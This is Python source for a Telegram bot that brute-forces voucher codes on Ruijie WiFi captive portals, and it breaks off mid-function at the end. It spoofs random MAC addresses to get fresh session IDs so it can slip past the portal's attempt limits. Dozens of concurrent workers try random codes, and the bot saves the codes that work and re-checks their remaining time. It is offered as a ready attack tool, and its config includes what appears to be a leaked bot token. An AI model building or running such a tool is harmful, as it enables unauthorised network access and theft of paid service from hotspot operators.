#!/usr/bin/env python3
"""
Ruijie Free Voucher Scanner Bot — Improved Edition
Fixes: I/O bottleneck, worker cleanup, dashboard stop bug
New : /help /status /delete_url, uppercase charset, scan summary
"""

import os, re, sys, time, json, string, random, asyncio, aiohttp
from datetime import datetime
from urllib.parse import urlparse, parse_qs, urljoin, urlencode, urlunparse

from telebot.async_telebot import AsyncTeleBot
from telebot.types import (
    ReplyKeyboardMarkup, KeyboardButton,
    InlineKeyboardMarkup, InlineKeyboardButton
)

# ─────────────────────────── CONFIG ───────────────────────────────────────────
BOT_TOKEN = os.environ.get("8861766275:AAHjSsheOaYEImCdQcE7Xug9NQghMtKBqN4", "").strip().strip('"').strip("'")
DATA_FILE = "bot_data.json"

WORKERS_PER_USER   = 50     # concurrent workers (200 → 50 is safer, still fast)
PER_SESSION_MAX    = 8      # refresh session after 8 uses (Ruijie limit = 9)
REQUEST_TIMEOUT    = 8      # seconds per HTTP request
SAVE_INTERVAL      = 60     # seconds between periodic disk saves
DASHBOARD_INTERVAL = 3      # seconds between dashboard refreshes

# ─────────────────────────── DATA MANAGER ─────────────────────────────────────
class DataManager:
    def __init__(self, path: str):
        self.path = path
        self.data: dict = {"users": {}}
        self._dirty = False
        self._load()

    def _load(self):
        if os.path.exists(self.path):
            try:
                with open(self.path) as f:
                    saved = json.load(f)
                self.data.update(saved)
            except Exception as e:
                print(f"[DataManager] load error: {e}")
        self._save_now()

    def _save_now(self):
        try:
            with open(self.path, "w") as f:
                json.dump(self.data, f, indent=2)
            self._dirty = False
        except Exception as e:
            print(f"[DataManager] save error: {e}")

    def mark_dirty(self):
        self._dirty = True

    async def periodic_save(self):
        """Background coroutine — saves to disk every SAVE_INTERVAL seconds."""
        while True:
            await asyncio.sleep(SAVE_INTERVAL)
            if self._dirty:
                self._save_now()

    # ── User helpers ──────────────────────────────────────────────────────────
    _DEFAULT_SETTINGS = {
        "char_set": "0123456789", "code_len": 6,
        "auto_check": False, "auto_check_interval": 3600,
    }

    def get_user(self, uid: int | str) -> dict:
        uid = str(uid)
        if uid not in self.data["users"]:
            self.data["users"][uid] = {
                "urls": [], "success_codes": [],
                "settings": dict(self._DEFAULT_SETTINGS),
                "scan_history": [],
            }
            self.mark_dirty()
        u = self.data["users"][uid]
        u.setdefault("urls", [])
        u.setdefault("success_codes", [])
        u.setdefault("settings", dict(self._DEFAULT_SETTINGS))
        u["settings"].setdefault("auto_check", False)
        u["settings"].setdefault("auto_check_interval", 3600)
        u.setdefault("scan_history", [])
        return u

    def add_scan_history(self, uid, summary: dict):
        u = self.get_user(uid)
        u["scan_history"].append(summary)
        u["scan_history"] = u["scan_history"][-10:]  # keep last 10
        self.mark_dirty()

    def add_url(self, uid, url: str) -> bool:
        u = self.get_user(uid)
        if url in u["urls"]:
            return False
        u["urls"].append(url)
        self.mark_dirty()
        return True

    def delete_url(self, uid, index: int) -> str | None:
        u = self.get_user(uid)
        if 0 <= index < len(u["urls"]):
            removed = u["urls"].pop(index)
            self.mark_dirty()
            return removed
        return None

    def clear_urls(self, uid):
        self.get_user(uid)["urls"] = []
        self.mark_dirty()

    def add_success(self, uid, code: str, meta: dict | None = None):
        u = self.get_user(uid)
        existing = [
            (e["code"] if isinstance(e, dict) else e)
            for e in u["success_codes"]
        ]
        if code not in existing:
            entry = {"code": code, "found_at": datetime.now().strftime("%Y-%m-%d %H:%M:%S")}
            if meta:
                entry.update(meta)
            u["success_codes"].append(entry)
            self.mark_dirty()

    def clear_success(self, uid):
        self.get_user(uid)["success_codes"] = []
        self.mark_dirty()

    def set_setting(self, uid, key: str, val):
        self.get_user(uid)["settings"][key] = val
        self.mark_dirty()


db = DataManager(DATA_FILE)

# ─────────────────────────── USER SESSION ─────────────────────────────────────
class UserSession:
    def __init__(self, uid: int):
        self.uid          = uid
        self.stop_event   = asyncio.Event()
        self.pause_event  = asyncio.Event()   # set = paused
        self.scan_task    : asyncio.Task | None = None
        self.status_msg_id: int | None = None
        self.state        : str | None = None
        self.stats        = self._blank_stats()

    @staticmethod
    def _blank_stats() -> dict:
        return {
            "tried": 0, "hits": 0,
            "current": "------",
            "start": 0.0,
            "paused_secs": 0.0,
            "pause_start": 0.0,
        }

    def reset(self):
        self.stats = self._blank_stats()
        self.stats["start"] = time.time()
        self.stop_event.clear()
        self.pause_event.clear()

    def is_running(self) -> bool:
        return self.scan_task is not None and not self.scan_task.done()

    def is_paused(self) -> bool:
        return self.pause_event.is_set()


_sessions: dict[int, UserSession] = {}

def get_session(uid: int) -> UserSession:
    if uid not in _sessions:
        _sessions[uid] = UserSession(uid)
    return _sessions[uid]


# ─────────────────────────── BOT INSTANCE ─────────────────────────────────────
bot = AsyncTeleBot(BOT_TOKEN, parse_mode="HTML")


# ─────────────────────────── SCANNER ENGINE ───────────────────────────────────
def random_mac() -> str:
    return ":".join(f"{random.randint(0,255):02x}" for _ in range(6))


async def fetch_session_id(http: aiohttp.ClientSession, portal_url: str) -> str | None:
    """
    Navigate the Ruijie captive-portal redirect chain and extract sessionId.
    """
    hdrs = {"User-Agent": "Mozilla/5.0 (Linux; Android 13; K) AppleWebKit/537.36 Chrome/120 Mobile Safari/537.36"}
    try:
        parsed = urlparse(portal_url)
        qs     = parse_qs(parsed.query)
        qs["mac"] = [random_mac()]
        spoofed = urlunparse(parsed._replace(query=urlencode(qs, doseq=True)))

        async with http.get(spoofed, headers=hdrs, timeout=REQUEST_TIMEOUT, ssl=False) as r:
            body = await r.text()
            m = re.search(r"location\.href\s*=\s*['\"]([^'\"]+)['\"]", body)
            final = urljoin(spoofed, m.group(1)) if m else str(r.url)

            if m:
                async with http.get(final, headers=hdrs, timeout=REQUEST_TIMEOUT, ssl=False) as r2:
                    final = str(r2.url)

        pq  = parse_qs(urlparse(final).query)
        sid = (pq.get("sessionId") or pq.get("sid") or [None])[0]
        return sid
    except Exception as e:
        print(f"[SID] error: {e}")
        return None


async def try_voucher(
    http: aiohttp.ClientSession,
    base_url: str,
    session_id: str,
    code: str,
) -> tuple[str, dict]:
    """
    POST voucher code to Ruijie portal.
    Returns: (result_str, response_data)
      result_str: 'success' | 'failed' | 'expired' | 'error'
      response_data: parsed JSON dict (may be empty on failure)
    """
    endpoints = [
        f"{base_url}/api/auth/voucher/?lang=en_US",
        f"{base_url}/api/auth/voucher/",
    ]
    payload = {
        "accessCode": code,
        "voucher":    code,
        "sessionId":  session_id,
        "apiVersion": "",
        "attempts":   1,
    }
    hdrs = {
        "Content-Type": "application/json",
        "User-Agent":   "Mozilla/5.0 (Linux; Android 13; K)",
    }
    for url in endpoints:
        try:
            async with http.post(url, json=payload, headers=hdrs,
                                 timeout=5, ssl=False) as r:
                raw  = await r.text()
                body = raw.lower()
                try:
                    data = json.loads(raw)
                except Exception:
                    data = {}
                if '"success":true' in body or "logonurl" in body:
                    return "success", data
                if "request limited" in body or ("session" in body and "expired" in body):
                    return "expired", data
                if r.status == 200:
                    return "failed", data
        except asyncio.TimeoutError:
            return "error", {}
        except Exception:
            continue
    return "error", {}


def _extract_time_meta(data: dict) -> dict:
    """Pull remaining-time info out of a Ruijie API response dict."""
    meta: dict = {}
    # Remaining seconds
    for key in ("remainingTime", "remaining_time", "remainTime", "timeRemaining", "validTime"):
        if key in data and data[key] is not None:
            secs = int(data[key])
            meta["remaining_secs"] = secs
            h, m = divmod(secs // 60, 60) if secs >= 60 else (0, secs // 60)
            meta["remaining_str"] = f"{h}h {m}m" if h else f"{m}m {secs%60}s"
            break
    # Expiry timestamp
    for key in ("expireTime", "expire_time", "expiry", "expireDate", "validUntil", "endTime"):
        if key in data and data[key]:
            meta["expire_time"] = str(data[key])
            break
    # Nested inside a "data" sub-object
    if not meta and isinstance(data.get("data"), dict):
        meta = _extract_time_meta(data["data"])
    return meta


async def scanner_worker(
    uid: int,
    http: aiohttp.ClientSession,
    urls: list[str],
    tried: set[str],
    char_set: str,
    code_len: int,
):
    """Single concurrent scanning coroutine."""
    sess    = get_session(uid)
    sid     = None
    use_cnt = 0
    url_idx = 0

    while not sess.stop_event.is_set():
        portal_url = urls[url_idx % len(urls)]
        base_url   = f"{urlparse(portal_url).scheme}://{urlparse(portal_url).netloc}"

        # Refresh session ID when needed
        if sid is None or use_cnt >= PER_SESSION_MAX:
            sid = await fetch_session_id(http, portal_url)
            if not sid:
                url_idx += 1
                await asyncio.sleep(0.5)
                continue
            use_cnt = 0

        # Generate unique code
        code = "".join(random.choices(char_set, k=code_len))
        if code in tried:
            continue
        tried.add(code)

        # ── Pause support ─────────────────────────────────────────────────────
        while sess.is_paused() and not sess.stop_event.is_set():
            await asyncio.sleep(0.5)
        if sess.stop_event.is_set():
            break

        sess.stats["current"] = code
        result, resp_data = await try_voucher(http, base_url, sid, code)
        sess.stats["tried"] += 1
        use_cnt += 1

        if result == "success":
            sess.stats["hits"] += 1
            meta = _extract_time_meta(resp_data)
            db.add_success(uid, code, meta if meta else None)
            time_line = ""
            if meta.get("remaining_str"):
                time_line = f"\n⏳ Remaining: <b>{meta['remaining_str']}</b>"
            elif meta.get("expire_time"):
                time_line = f"\n📅 Expires: <b>{meta['expire_time']}</b>"
            await bot.send_message(
                uid,
                f"✅ <b>FOUND:</b> <code>{code}</code>\n"
                f"🕐 {datetime.now().strftime('%H:%M:%S')}"
                f"{time_line}",
            )

        elif result == "expired":
            sid = None  # force refresh

        elif result == "error":
            sid = None
            await asyncio.sleep(0.3)


async def dashboard_updater(uid: int):
    """Periodically edits the status message while scan is running."""
    sess = get_session(uid)
    while not sess.stop_event.is_set():
        await asyncio.sleep(DASHBOARD_INTERVAL)
        if not sess.status_msg_id:
            continue
        paused  = sess.is_paused()
        elapsed = time.time() - sess.stats["start"] - sess.stats.get("paused_secs", 0)
        tried   = sess.stats["tried"]
        speed   = tried / elapsed if elapsed > 0 else 0.0
        state_line = "⏸ <b>PAUSED</b>" if paused else "🔥 <b>VOUCHER SCANNER RUNNING</b>"
        text = (
            f"{state_line}\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⏰ <b>Clock  :</b> {datetime.now().strftime('%H:%M:%S')}\n"
            f"⏱ <b>Elapsed:</b> {int(elapsed//60)}m {int(elapsed%60)}s\n"
            f"🚀 <b>Speed  :</b> {speed:.1f} req/s\n"
            f"🏹 <b>Tried  :</b> {tried:,}\n"
            f"🎯 <b>Found  :</b> {sess.stats['hits']}\n"
            f"🔑 <b>Current:</b> <code>{sess.stats['current']}</code>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n"
            f"⚡ {WORKERS_PER_USER} concurrent workers"
        )
        markup = InlineKeyboardMarkup()
        if paused:
            markup.row(
                InlineKeyboardButton("▶️ RESUME", callback_data="resume_scan"),
                InlineKeyboardButton("🛑 STOP",   callback_data="stop_scan"),
            )
        else:
            markup.row(
                InlineKeyboardButton("⏸ PAUSE",   callback_data="pause_scan"),
                InlineKeyboardButton("🛑 STOP",    callback_data="stop_scan"),
            )
        try:
            await bot.edit_message_text(
                text, chat_id=uid,
                message_id=sess.status_msg_id,
                reply_markup=markup,
            )
        except Exception:
            pass


async def run_scan(uid: int):
    """Main scan orchestrator — creates workers and dashboard, cleans up on stop."""
    sess   = get_session(uid)
    u_data = db.get_user(uid)
    urls   = u_data["urls"]
    cfg    = u_data["settings"]
    tried  : set[str] = set()

    connector = aiohttp.TCPConnector(
        limit=WORKERS_PER_USER, limit_per_host=0,
        ttl_dns_cache=300, ssl=False,
    )
    try:
        async with aiohttp.ClientSession(connector=connector) as http:
            workers = [
                asyncio.create_task(
                    scanner_worker(uid, http, urls, tried, cfg["char_set"], cfg["code_len"])
                )
                for _ in range(WORKERS_PER_USER)
            ]
            dash = asyncio.create_task(dashboard_updater(uid))
            await sess.stop_event.wait()
            for t in workers + [dash]:
                t.cancel()
            await asyncio.gather(*workers, dash, return_exceptions=True)
    finally:
        elapsed = time.time() - sess.stats["start"] - sess.stats.get("paused_secs", 0)
        tried_n = sess.stats["tried"]
        hits    = sess.stats["hits"]
        speed   = tried_n / elapsed if elapsed > 0 else 0.0
        summary = {
            "date":    datetime.now().strftime("%Y-%m-%d %H:%M"),
            "elapsed": f"{int(elapsed//60)}m {int(elapsed%60)}s",
            "tried":   tried_n,
            "found":   hits,
            "speed":   round(speed, 1),
            "charset": cfg["char_set"][:15],
            "length":  cfg["code_len"],
        }
        db.add_scan_history(uid, summary)
        await bot.send_message(
            uid,
            f"🛑 <b>Scan Finished</b>\n"
            f"━━━━━━━━━━━━━━━\n"
            f"⏱ Runtime : {summary['elapsed']}\n"
            f"🏹 Tried   : {tried_n:,}\n"
            f"🚀 Avg spd : {speed:.1f} req/s\n"
            f"🎯 Found   : {hits}\n",
            reply_markup=main_keyboard(),
        )
        db._save_now()


# ─────────────────────────── KEYBOARDS ────────────────────────────────────────
def main_keyboard() -> ReplyKeyboardMarkup:
    kb = ReplyKeyboardMarkup(resize_keyboard=True, row_width=2)
    kb.add(KeyboardButton("🔗 Add URL"),      KeyboardButton("📋 My URLs"))
    kb.add(KeyboardButton("⚙️ Settings"),     KeyboardButton("🚀 Start Scan"))
    kb.add(KeyboardButton("📄 Success Codes"), KeyboardButton("🛑 Stop Scan"))
    kb.add(KeyboardButton("⏸ Pause/Resume"),  KeyboardButton("📊 Status"))
    kb.add(KeyboardButton("🕐 Check Codes"),  KeyboardButton("📈 History"))
    kb.add(KeyboardButton("🔔 Auto-Check"))
    return kb


def charset_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=2)
    kb.add(
        InlineKeyboardButton("🔢 Digits 0-9",       callback_data="cs_digits"),
        InlineKeyboardButton("🔤 Lowercase a-z",    callback_data="cs_lower"),
        InlineKeyboardButton("🔠 Uppercase A-Z",    callback_data="cs_upper"),
        InlineKeyboardButton("🔀 Digits + lower",   callback_data="cs_mixdl"),
        InlineKeyboardButton("🎲 Digits + upper",   callback_data="cs_mixdu"),
        InlineKeyboardButton("🌐 All alnum",        callback_data="cs_all"),
    )
    return kb


def length_keyboard() -> InlineKeyboardMarkup:
    kb = InlineKeyboardMarkup(row_width=4)
    kb.add(*[
        InlineKeyboardButton(f"{n}", callback_data=f"cl_{n}")
        for n in range(4, 11)
    ])
    return kb


CHARSETS = {
    "cs_digits": ("Digits 0-9",        string.digits),
    "cs_lower":  ("Lowercase a-z",     string.ascii_lowercase),
    "cs_upper":  ("Uppercase A-Z",     string.ascii_uppercase),
    "cs_mixdl":  ("Digits + lower",    string.digits + string.ascii_lowercase),
    "cs_mixdu":  ("Digits + upper",    string.digits + string.ascii_uppercase),
    "cs_all":    ("All alphanumeric",  string.digits + string.ascii_letters),
}


# ─────────────────────────── COMMAND HANDLERS ─────────────────────────────────
@bot.message_handler(commands=["start"])
async def cmd_start(msg):
    sess = get_session(msg.from_user.id)
    sess.state = None
    await bot.reply_to(
        msg,
        f"👋 <b>Ruijie Voucher Scanner Bot</b>\n\n"
        f"🆔 Your ID: <code>{msg.from_user.id}</code>\n\n"
        f"📌 Add your Ruijie portal URL and start scanning.\n"
        f"Use /help for command list.",
        reply_markup=main_keyboard(),
    )


@bot.message_handler(commands=["help"])
async def cmd_help(msg):
    await bot.reply_to(
        msg,
        "📖 <b>Commands</b>\n\n"
        "/start   — Welcome screen\n"
        "/help    — This message\n"
        "/status  — Current scan stats\n"
        "/myid    — Show your Telegram ID\n\n"
        "<b>Keyboard Buttons</b>\n"
        "🔗 Add URL       — Add a portal URL\n"
        "📋 My URLs      — List / delete URLs\n"
        "⚙️ Settings     — Charset & code length\n"
        "🚀 Start Scan   — Begin bruteforce\n"
        "📄 Success Codes — View found codes + time info\n"
        "🛑 Stop Scan    — Stop running scan\n"
        "⏸ Pause/Resume  — Pause or resume active scan\n"
        "📊 Status        — Live scan stats\n"
        "🕐 Check Codes  — Re-test codes & show remaining time\n"
        "📈 History       — Last 10 scan session summaries\n"
        "🔔 Auto-Check   — Toggle hourly code expiry alerts\n",
        reply_markup=main_keyboard(),
    )


@bot.message_handler(commands=["status"])
async def cmd_status(msg):
    await handle_status(msg.from_user.id, msg)


@bot.message_handler(commands=["myid"])
async def cmd_myid(msg):
    await bot.reply_to(msg, f"🆔 Your Telegram ID: <code>{msg.from_user.id}</code>")


# ─────────────────────────── MESSAGE HANDLER ──────────────────────────────────
@bot.message_handler(content_types=["text"])
async def handle_text(msg):
    uid  = msg.from_user.id
    sess = get_session(uid)
    text = msg.text.strip()

    # ── State: waiting for URL ────────────────────────────────────────────────
    if sess.state == "waiting_url":
        sess.state = None
        if not re.match(r"https?://", text):
            await bot.reply_to(msg, "❌ URL must start with http:// or https://")
            return
        if db.add_url(uid, text):
            await bot.reply_to(msg, "✅ <b>URL added!</b>", reply_markup=main_keyboard())
        else:
            await bot.reply_to(msg, "⚠️ That URL is already in your list.", reply_markup=main_keyboard())
        return

    # ── State: waiting to delete URL by number ────────────────────────────────
    if sess.state == "waiting_del_url":
        sess.state = None
        try:
            idx = int(text) - 1
            removed = db.delete_url(uid, idx)
            if removed:
                await bot.reply_to(msg, f"🗑 Deleted: <code>{removed[:80]}</code>", reply_markup=main_keyboard())
            else:
                await bot.reply_to(msg, "❌ Invalid number.", reply_markup=main_keyboard())
        except ValueError:
            await bot.reply_to(msg, "❌ Please send a number.", reply_markup=main_keyboard())
        return

    # ── Keyboard buttons ──────────────────────────────────────────────────────
    if text == "🔗 Add URL":
        sess.state = "waiting_url"
        await bot.reply_to(
            msg,
            "📎 Send the Ruijie portal URL.\n\n"
            "<i>Example:\n"
            "http://192.168.0.1:2060/wifidog/auth?gw_id=...</i>",
        )

    elif text == "📋 My URLs":
        urls = db.get_user(uid)["urls"]
        if not urls:
            await bot.reply_to(msg, "❌ No URLs saved yet.")
            return
        body = "\n".join(f"{i+1}. <code>{u[:90]}</code>" for i, u in enumerate(urls))
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("🗑 Clear All", callback_data="clear_urls"),
            InlineKeyboardButton("❌ Delete One", callback_data="del_one_url"),
        )
        await bot.reply_to(msg, f"<b>📋 Your URLs ({len(urls)}):</b>\n\n{body}", reply_markup=kb)

    elif text == "⚙️ Settings":
        u = db.get_user(uid)
        cfg = u["settings"]
        await bot.reply_to(
            msg,
            f"⚙️ <b>Current Settings</b>\n"
            f"Charset : <code>{cfg['char_set'][:30]}{'…' if len(cfg['char_set'])>30 else ''}</code>\n"
            f"Length  : <b>{cfg['code_len']}</b>\n\n"
            f"Select character set:",
            reply_markup=charset_keyboard(),
        )

    elif text == "🚀 Start Scan":
        await start_scan(uid, msg)

    elif text == "🛑 Stop Scan":
        await stop_scan(uid, msg)

    elif text == "📄 Success Codes":
        codes = db.get_user(uid)["success_codes"]
        if not codes:
            await bot.reply_to(msg, "⚠️ No success codes found yet.")
            return
        lines = []
        for i, entry in enumerate(codes, 1):
            if isinstance(entry, dict):
                c = entry["code"]
                found_at = entry.get("found_at", "")
                rem = entry.get("remaining_str", "")
                exp = entry.get("expire_time", "")
                extra = f" | ⏳{rem}" if rem else (f" | 📅{exp}" if exp else "")
                ts   = f"\n   📌 {found_at}" if found_at else ""
                lines.append(f"{i}. <code>{c}</code>{extra}{ts}")
            else:
                lines.append(f"{i}. <code>{entry}</code>")
        body = "\n".join(lines)
        kb = InlineKeyboardMarkup()
        kb.row(
            InlineKeyboardButton("🗑 Clear All", callback_data="clear_success"),
            InlineKeyboardButton("🕐 Check Time", callback_data="check_codes_time"),
        )
        await bot.reply_to(msg, f"🎯 <b>Success Codes ({len(codes)}):</b>\n\n{body}", reply_markup=kb)

    elif text == "📊 Status":
        await handle_status(uid, msg)

    elif text == "🕐 Check Codes":
        await check_codes_time(uid, msg)

    elif text == "⏸ Pause/Resume":
        sess = get_session(uid)
        if not sess.is_running():
            await bot.reply_to(msg, "⚠️ No scan running.")
            return
        if sess.is_paused():
            paused_dur = time.time() - sess.stats.get("pause_start", time.time())
            sess.stats["paused_secs"] = sess.stats.get("paused_secs", 0) + paused_dur
            sess.pause_event.clear()
            await bot.reply_to(msg, "▶️ <b>Scan resumed.</b>")
        else:
            sess.stats["pause_start"] = time.time()
            sess.pause_event.set()
            await bot.reply_to(msg, "⏸ <b>Scan paused.</b> Send ⏸ Pause/Resume again to resume.")

    elif text == "📈 History":
        history = db.get_user(uid).get("scan_history", [])
        if not history:
            await bot.reply_to(msg, "📈 No scan history yet.")
            return
        lines = []
        for i, s in enumerate(reversed(history), 1):
            lines.append(
                f"<b>#{i}</b> {s.get('date','?')}\n"
                f"   ⏱{s.get('elapsed','?')} | 🏹{s.get('tried',0):,} | "
                f"🎯{s.get('found',0)} | 🚀{s.get('speed',0)}r/s\n"
                f"   Len:{s.get('length','?')} Charset:{s.get('charset','?')}"
            )
        await bot.reply_to(
            msg,
            "📈 <b>Scan History (latest first)</b>\n━━━━━━━━━━━━━━━\n" +
            "\n\n".join(lines),
        )

    elif text == "🔔 Auto-Check":
        cfg = db.get_user(uid)["settings"]
        enabled = cfg.get("auto_check", False)
        if enabled:
            db.set_setting(uid, "auto_check", False)
            stop_auto_check(uid)
            await bot.reply_to(msg, "🔕 <b>Auto-Check disabled.</b>\nBot will no longer check codes automatically.")
        else:
            db.set_setting(uid, "auto_check", True)
            start_auto_check(uid)
            interval_h = cfg.get("auto_check_interval", 3600) // 3600
            await bot.reply_to(
                msg,
                f"🔔 <b>Auto-Check enabled!</b>\n"
                f"Checks every <b>{interval_h}h</b>. You'll get alerted when codes expire.\n"
                f"<i>Tap again to disable.</i>"
            )


# ─────────────────────────── HELPERS ──────────────────────────────────────────
async def start_scan(uid: int, msg):
    sess = get_session(uid)
    if not db.get_user(uid)["urls"]:
        await bot.reply_to(msg, "⚠️ Add at least one URL first!")
        return
    if sess.is_running():
        await bot.reply_to(msg, "⚠️ Scan already running. Use 🛑 Stop Scan first.")
        return
    sess.reset()
    status_msg = await bot.reply_to(msg, "🚀 <b>Initializing scanner…</b>")
    sess.status_msg_id = status_msg.message_id
    sess.scan_task = asyncio.create_task(run_scan(uid))


async def stop_scan(uid: int, msg=None):
    sess = get_session(uid)
    if sess.is_running():
        sess.stop_event.set()
        try:
            await asyncio.wait_for(sess.scan_task, timeout=5)
        except (asyncio.TimeoutError, asyncio.CancelledError):
            if sess.scan_task:
                sess.scan_task.cancel()
        sess.scan_task = None
        if msg:
            await bot.reply_to(msg, "🛑 <b>Stopping scanner…</b>")
    else:
        if msg:
            await bot.reply_to(msg, "⚠️ No scan is currently running.")


_auto_check_tasks: dict[int, asyncio.Task] = {}


async def auto_check_loop(uid: int):
    """Background task: re-checks codes every interval, notifies user if any expired."""
    while True:
        interval = db.get_user(uid)["settings"].get("auto_check_interval", 3600)
        await asyncio.sleep(interval)
        u    = db.get_user(uid)
        codes = u["success_codes"]
        urls  = u["urls"]
        if not codes or not urls:
            continue

        expired_codes: list[str] = []
        connector = aiohttp.TCPConnector(limit=5, ssl=False)
        async with aiohttp.ClientSession(connector=connector) as http:
            for entry in codes:
                code = entry["code"] if isinstance(entry, dict) else entry
                sid  = None
                for portal_url in urls:
                    sid = await fetch_session_id(http, portal_url)
                    if sid:
                        break
                if not sid:
                    continue
                base_url = f"{urlparse(urls[0]).scheme}://{urlparse(urls[0]).netloc}"
                result, _ = await try_voucher(http, base_url, sid, code)
                if result == "failed":
                    expired_codes.append(code)

        if expired_codes:
            lines = "\n".join(f"❌ <code>{c}</code>" for c in expired_codes)
            kb = InlineKeyboardMarkup()
            kb.row(InlineKeyboardButton(
                f"🗑 Remove {len(expired_codes)} Expired",
                callback_data=f"rm_expired"
            ))
            await bot.send_message(
                uid,
                f"🔔 <b>Auto-Check Alert</b>\n"
                f"━━━━━━━━━━━━━━━\n"
                f"{len(expired_codes)} code(s) expired:\n{lines}",
                reply_markup=kb,
            )


def start_auto_check(uid: int):
    if uid not in _auto_check_tasks or _auto_check_tasks[uid].done():
        _auto_check_tasks[uid] = asyncio.create_task(auto_check_loop(uid))


def stop_auto_check(uid: int):
    if uid in _auto_check_tasks and not _auto_check_tasks[uid].done():
        _auto_check_tasks[uid].cancel()
        del _auto_check_tasks[uid]


async def check_codes_time(uid: int, msg):
    """Re-test every saved success code against the portal and report remaining time."""
    u     = db.get_user(uid)
    codes = u["success_codes"]
    urls  = u["urls"]

    if not codes:
        await bot.reply_to(msg, "⚠️ No success codes saved yet.")
        return
    if not urls:
        await bot.reply_to(msg, "⚠️ Add at least one portal URL first (needed to check codes).")
        return

    wait_msg = await bot.reply_to(
        msg, f"🔍 <b>Checking {len(codes)} code(s)…</b>\nPlease wait.",
    )

    connector = aiohttp.TCPConnector(limit=10, ssl=False)
    results: list[str] = []
    expired_codes: list[str] = []

    async with aiohttp.ClientSession(connector=connector) as http:
        for entry in codes:
            code     = entry["code"] if isinstance(entry, dict) else entry
            found_at = entry.get("found_at", "?") if isinstance(entry, dict) else "?"
            sid = None
            for portal_url in urls:
                sid = await fetch_session_id(http, portal_url)
                if sid:
                    break
            if not sid:
                results.append(f"⚠️ <code>{code}</code> — could not connect")
                continue
            base_url = f"{urlparse(urls[0]).scheme}://{urlparse(urls[0]).netloc}"
            result, resp_data = await try_voucher(http, base_url, sid, code)
            meta = _extract_time_meta(resp_data)
            if result == "success":
                if meta.get("remaining_str"):
                    time_info = f"⏳ <b>{meta['remaining_str']}</b> remaining"
                elif meta.get("expire_time"):
                    time_info = f"📅 Expires <b>{meta['expire_time']}</b>"
                else:
                    time_info = "✅ Still valid (no time info)"
                results.append(f"✅ <code>{code}</code>\n   {time_info}\n   📌 {found_at}")
            elif result == "failed":
                expired_codes.append(code)
                results.append(f"❌ <code>{code}</code> — <i>expired / used</i>\n   📌 {found_at}")
            else:
                results.append(f"⚠️ <code>{code}</code> — <i>error ({result})</i>")

    body = "\n\n".join(results)
    kb   = InlineKeyboardMarkup()
    if expired_codes:
        kb.row(InlineKeyboardButton(
            f"🗑 Remove {len(expired_codes)} Expired", callback_data="rm_expired"
        ))
    # Store expired list temporarily in session state
    get_session(uid).state = f"expired:{','.join(expired_codes)}" if expired_codes else None

    try:
        await bot.edit_message_text(
            f"🕐 <b>Code Time Check ({len(codes)} codes)</b>\n"
            f"━━━━━━━━━━━━━━━━━━━━━━━\n{body}",
            chat_id=msg.chat.id,
            message_id=wait_msg.message_id,
            reply_markup=kb if expired_codes else None,
        )
    except Exception:
        await bot.send_message(
            uid,
            f"🕐 <b>Code Time Check</b>\n━━━━━━━━━━━━━━━━━━━━━━━\n{body}",
            reply_markup=kb if expired_codes else None,
        )


async def handle_status(uid: int, msg):
    sess = get_session(uid)
    if not sess.is_running():
        await bot.reply_to(msg, "📊 No scan running.\nUse 🚀 Start Scan to begin.")
        return
    elapsed = time.time() - sess.stats["start"]
    tried   = sess.stats["tried"]
    speed   = tried / elapsed if elapsed > 0 else 0.0
    await bot.reply_to(
        msg,
        f"📊 <b>Live Status</b>\n"
        f"⏱ Elapsed: {int(elapsed//60)}m {int(elapsed%60)}s\n"
        f"🚀 Speed  : {speed:.1f} req/s\n"
        f"🏹 Tried  : {tried:,}\n"
        f"🎯 Found  : {sess.stats['hits']}\n"
        f"🔑 Current: <code>{sess.stats['current']}</code>",
    )


# ─────────────────────────── CALLBACK HANDLERS ────────────────────────────────
@bot.callback_query_handler(func=lambda c: c.data in CHARSETS)
async def cb_charset(call):
    uid   = call.from_user.id
    label, chars = CHARSETS[call.data]
    db.set_setting(uid, "char_set", chars)
    await bot.answer_callback_query(call.id, f"Charset: {label}")
    await bot.edit_message_text(
        f"✅ Charset set to <b>{label}</b>\n\nNow select code length:",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
        reply_markup=length_keyboard(),
    )


@bot.callback_query_handler(func=lambda c: c.data.startswith("cl_"))
async def cb_length(call):
    uid = call.from_user.id
    n   = int(call.data.split("_")[1])
    db.set_setting(uid, "code_len", n)
    cfg = db.get_user(uid)["settings"]
    await bot.answer_callback_query(call.id, f"Length set to {n}")
    await bot.edit_message_text(
        f"✅ <b>Settings saved!</b>\n\n"
        f"Charset : <code>{cfg['char_set'][:30]}</code>\n"
        f"Length  : <b>{n}</b>\n\n"
        f"Ready to scan 🚀",
        chat_id=call.message.chat.id,
        message_id=call.message.message_id,
    )


@bot.callback_query_handler(func=lambda c: c.data == "stop_scan")
async def cb_stop(call):
    uid = call.from_user.id
    await bot.answer_callback_query(call.id, "Stopping…")
    await stop_scan(uid)
    try:
        await bot.edit_message_reply_markup(
            chat_id=call.message.chat.id,
            message_id=call.message.message_id,
            reply_markup=None,
        )
    except Exception:
        pass


@bot.callback_query_handler(func=lambda c: c.data == "clear_urls")
async def cb_clear_urls(call):
    db.clear_urls(call.from_user.id)
    await bot.answer_callback_query(call.id, "All URLs cleared!", show_alert=True)
    await bot.edit_message_text("🗑 <b>All URLs cleared.</b>",
                                chat_id=call.message.chat.id,
                                message_id=call.message.message_id)


@bot.callback_query_handler(func=lambda c: c.data == "del_one_url")
async def cb_del_one(call):
    uid  = call.from_user.id
    sess = get_session(uid)
    urls = db.get_user(uid)["urls"]
    sess.state = "waiting_del_url"
    await bot.answer_callback_query(call.id)
    await bot.send_message(
        uid,
        f"Send the <b>number</b> of the URL to delete (1–{len(urls)}):",
    )


@bot.callback_query_handler(func=lambda c: c.data == "clear_success")
async def cb_clear_success(call):
    db.clear_success(call.from_user.id)
    await bot.answer_callback_query(call.id, "Success codes cleared!", show_alert=True)
    await bot.edit_message_text("🗑 <b>Success codes cleared.</b>",
                                chat_id=call.message.chat.id,
                                message_id=call.message.message_id)


@bot.callback_query_handler(func=lambda c: c.data == "check_codes_time")
async def cb_check_codes_time(call):
    await bot.answer_callback_query(call.id, "Checking codes…")
    await check_codes_time(call.from_user.id, call.message)


@bot.callback_query_handler(func=lambda c: c.data == "rm_expired")
async def cb_rm_expired(call):
